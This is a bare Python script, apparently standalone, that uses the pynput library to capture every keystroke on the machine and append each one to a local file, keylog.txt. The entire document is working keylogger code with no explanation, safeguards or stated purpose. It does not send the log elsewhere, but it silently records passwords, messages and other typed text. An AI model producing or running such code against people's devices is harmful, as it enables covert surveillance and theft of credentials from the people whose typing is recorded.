from pynput.keyboard import Listener

def on_press(key):
    with open("keylog.txt", "a") as log_file:
        log_file.write(f"{str(key)}\n")

with Listener(on_press=on_press) as listener:
    listener.join()
